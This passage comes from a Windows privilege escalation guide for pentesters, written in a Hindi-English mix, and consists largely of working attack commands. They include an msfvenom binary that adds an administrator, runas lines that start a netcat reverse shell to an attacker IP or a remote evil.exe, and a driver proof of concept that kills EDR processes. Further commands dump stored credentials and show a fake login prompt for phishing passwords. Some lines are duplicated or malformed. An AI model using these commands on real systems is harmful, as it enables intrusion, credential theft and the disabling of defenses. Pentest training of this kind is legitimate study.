echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस भेद्यता का पता लगा सकते हैं और इसे exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप metasploit से मैन्युअली एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि किसी service में विफलता होती है तो कौन से actions लिए जाएँ। इस फीचर को किसी binary की ओर निर्देशित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। अधिक विवरण [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकते हैं।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **permissions of the binaries** (शायद आप एक को overwrite करके privilege escalate कर सकें) और **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लेखन अनुमतियाँ

जांचें कि क्या आप किसी config file को बदलकर किसी विशेष फ़ाइल को पढ़ सकते हैं, या क्या आप किसी binary को बदल सकते हैं जिसे Administrator account (schedtasks) द्वारा चलाया जाएगा।

सिस्टम में कमजोर फ़ोल्डर/फ़ाइल अनुमतियों को खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जांचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी दूसरे उपयोगकर्ता द्वारा execute किया जाएगा।**\
**पढ़ें** **निम्नलिखित पृष्ठ** ताकि आप रोचक **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver एक arbitrary kernel read/write primitive एक्सपोज़ करता है (कमज़ोर तरीके से डिज़ाइन किए गए IOCTL handlers में सामान्य), तो आप kernel memory से सीधे SYSTEM token चुरा कर privilege escalate कर सकते हैं। चरण-दर-चरण technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

उन race-condition बग्स के लिए जहाँ vulnerable call एक attacker-controlled Object Manager path खोलता है, lookup को जानबुझकर धीमा करना (using max-length components या deep directory chains) विंडो को microseconds से लेकर tens of microseconds तक बढ़ा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities आपको deterministic layouts तैयार करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को kernel paged-pool overflows में बदलने की अनुमति देती हैं, और वह भी बिना custom driver के। पूरी chain यहाँ देखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### device objects पर missing FILE_DEVICE_SECURE_OPEN का दुरुपयोग (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को एक मजबूत SDDL के साथ IoCreateDeviceSecure के ज़रिये बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय enforce नहीं होती जब device को किसी ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, जिससे कोई भी unprivileged user निम्न जैसे namespace path का उपयोग कर handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device खोल सके, तो driver द्वारा expose किए गए privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक दुनिया में देखी गई उदाहरण क्षमताएँ:
- किसी भी arbitrary process को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser)।
- अनरिस्ट्रिक्टेड raw disk read/write (offline tampering, boot-time persistence tricks)।
- arbitrary processes को terminate करना, जिनमें Protected Process/Light (PP/PPL) भी शामिल हैं, जिससे user land से kernel के जरिए AV/EDR को kill करने की अनुमति मिलती है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए निवारक उपाय
- जब आप ऐसे device objects बना रहे हों जिन्हें DACL द्वारा सीमित किया जाना है तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- प्रिविलेज्ड ऑपरेशनों के लिए कॉलर के संदर्भ को सत्यापित करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

डिटेक्शन विचार (डिफेंडर्स के लिए)
- संदिग्ध device नामों के user-mode opens की निगरानी करें (e.g., \\ .\\amsdk*) और दुरुपयोग संकेत करने वाले विशिष्ट IOCTL sequences पर ध्यान दें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी खुद की allow/deny lists बनाए रखें।

## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं तो आप किसी process द्वारा लोड की गई DLL को hijack करके **escalate privileges** कर सकते हैं।

PATH के अंदर मौजूद सभी फोल्डर्स के permissions जांचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जांच का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में हार्डकोड किए गए किसी भी अन्य ज्ञात कंप्यूटर की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करना, नियम बनाना, बंद करना, बंद करना...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में मिल सकती है

यदि आपको root user मिल जाता है, तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी पोर्ट पर listen करने के लिए करेंगे, तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा allow किया जाना चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को आसानी से root के रूप में शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` filesystem को `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में एक्सप्लोर कर सकते हैं

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault सर्वरों, वेबसाइट्स और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स स्टोर करता है जिन्हें **Windows** उपयोगकर्ताओं को **स्वचालित रूप से लॉग इन कर सके**। पहली नजर में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook क्रेडेंशियल्स, Twitter क्रेडेंशियल्स, Gmail क्रेडेंशियल्स आदि यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएँ। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनसे Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका अर्थ है कि कोई भी **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault और दिए गए क्रेडेंशियल्स का उपयोग कर सकता है, ताकि उपयोगकर्ताओं को बार-बार username और password दर्ज न करना पड़े।

जब तक एप्लिकेशन Credential Manager के साथ इंटरैक्ट नहीं करते, मुझे नहीं लगता कि वे किसी दिए गए रिसोर्स के लिए क्रेडेंशियल्स का उपयोग कर पाएँगे। इसलिए, यदि आपकी एप्लिकेशन vault का उपयोग करना चाहती है, तो उसे किसी न किसी तरह **communicate with the credential manager and request the credentials for that resource** default storage vault से करना चाहिए।

मशीन पर स्टोर किए गए क्रेडेंशियल्स को सूचीबद्ध करने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए credentials का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ चला सकते हैं। निम्न उदाहरण SMB share के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric encryption के लिए उपयोग होता है। यह encryption entropy में उल्लेखनीय योगदान के लिए user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के login secrets से व्युत्पन्न एक symmetric key के माध्यम से keys के encryption को सक्षम बनाता है।** सिस्टम encryption वाले परिदृश्यों में यह सिस्टम के domain authentication secrets का उपयोग करता है।

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त आर्ग्युमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग इसे डीक्रिप्ट करने के लिए कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके decrypt कर सकते हैं.\\
आप `sekurlsa::dpapi` module का उपयोग करके **memory** से कई **DPAPI** **masterkeys** निकाल सकते हैं (यदि आप root हैं)。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और automation tasks के लिए उपयोग किए जाते हैं ताकि encrypted credentials को सुविधाजनक तरीके से store किया जा सके। ये credentials **DPAPI** द्वारा protected होते हैं, जिसका सामान्यत: मतलब है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypted किया जा सकता है जिस पर इन्हें बनाया गया था।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाई-फाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें पा सकते हैं `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` module का उपयोग कर किसी भी .rdg files को **decrypt** करें।\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
आप memory से कई DPAPI masterkeys **extract** कर सकते हैं **Mimikatz** के `sekurlsa::dpapi` module के साथ।

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file.
लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **save passwords** और अन्य जानकारी रखने के लिए करते हैं, यह समझे बिना कि यह एक database file है।
This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
यह file `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में स्थित है और इसे ढूँढकर जाँचना हमेशा उपयोगी होता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**
**ध्यान दें कि AppCmd.exe से recover passwords करने के लिए आपको Administrator होना चाहिए और High Integrity level के तहत run करना होगा।**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.
अगर यह file मौजूद है तो संभव है कि कुछ **credentials** configured हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **run with SYSTEM privileges**, कई **DLL Sideloading (सूचना स्रोत** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर हो सकती हैं, इसलिए आपको जांचना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस path के अंदर कोई एंट्री पाते हैं तो यह संभवतः एक saved SSH key होगी। यह encrypted रूप में संग्रहीत है लेकिन इसे आसानी से decrypt किया जा सकता है [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर अपने आप शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के माध्यम से किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना निगरानी वाली फाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फाइलों को खोजने के लिए **metasploit** का भी उपयोग कर सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल **SiteList.xml** खोजें

### Cached GPP Pasword

एक ऐसा फीचर पहले उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से कई मशीनों पर custom local administrator accounts तैनात करने की अनुमति देता था। हालांकि, इस तरीके में गंभीर सुरक्षा कमियाँ थीं। पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में स्टोर होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर के पासवर्ड, जो AES256 से एनक्रिप्ट किए गए थे और एक publicly documented default key का उपयोग करते थे, किसी भी authenticated user द्वारा डीक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम पैदा करता था, क्योंकि इससे उपयोगकर्ता elevated privileges प्राप्त कर सकते थे।

इस जोखिम को कम करने के लिए, एक function विकसित किया गया जो स्थानीय रूप से कैश किए गए GPP फ़ाइलों को स्कैन करता है जिनमें एक खाली न होने वाला "cpassword" फ़ील्ड होता है। ऐसी फ़ाइल मिलने पर, यह function पासवर्ड को डीक्रिप्ट करता है और एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल के स्थान के बारे में विवरण शामिल होते हैं, जो इस सुरक्षा कमजोरियों की पहचान और निवारण में सहायक होते हैं।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डीक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग पासवर्ड प्राप्त करने के लिए:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials वाले web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा (यदि आपको लगता है कि वह उन्हें जान सकता है) **उपयोगकर्ता से उसके credentials या यहाँ तक कि किसी अन्य उपयोगकर्ता के credentials दर्ज करने के लिए कह सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **पूछना** और **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइलनाम जिनमें credentials हो सकते हैं**

